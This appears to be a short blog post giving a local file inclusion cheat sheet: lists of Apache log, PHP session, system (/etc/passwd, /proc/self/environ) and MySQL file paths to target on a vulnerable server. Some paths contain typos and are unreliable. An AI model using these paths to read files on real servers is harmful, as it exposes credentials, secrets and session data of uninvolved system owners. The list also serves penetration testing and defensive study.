---
layout: post
title: 'Local File Inclusion Cheat Sheet'
---


#### Introduction


This vulnerability lets the attacker gain access to sensitive files on the server.


### Logs


```javascript
/etc/httpd/logs/acces_log
/etc/httpd/logs/error_log
/var/www/logs/access_log
/var/www/logs/access.log
/usr/local/apache/logs/access_ log
/usr/local/apache/logs/access. log
/var/log/apache/access_log
/var/log/apache2/access_log
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/access_log
/var/log/dmessage
/var/log/mail
```

### Sessions

```javascript
/var/lib/php/sess_%SESSIONID%
/var/lib/php/session/sess_%SESSIONID%
/var/lib/php/sessions/sess_%SESSIONID%
/var/tmp/sess_%SESSIONID%
```


### Sensitive Files

```javascript
/etc/passwd
/etc/group
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/net/fib_trie
/proc/version
/proc/self/environ
/proc/self/fd/1
```

### Database files
```javascript
/var/lib/mysql/%DATABASE_NAME%/%DATABASE_TABLE%.frm
/var/lib/mysql/mysqld/mysqld.pid
```
